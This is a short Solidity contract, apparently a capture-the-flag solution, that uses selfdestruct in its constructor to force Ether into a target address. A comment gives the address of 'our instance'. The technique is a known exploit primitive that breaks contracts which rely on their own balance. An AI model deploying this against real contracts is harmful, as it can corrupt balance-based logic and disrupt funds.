// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract ForceSend {
    constructor(address payable _target) payable {
        require(msg.value > 0);
        selfdestruct(_target);
    }
}

// our instance 
// 0xB220810678025810157c51Dd98aDa3e33eD14242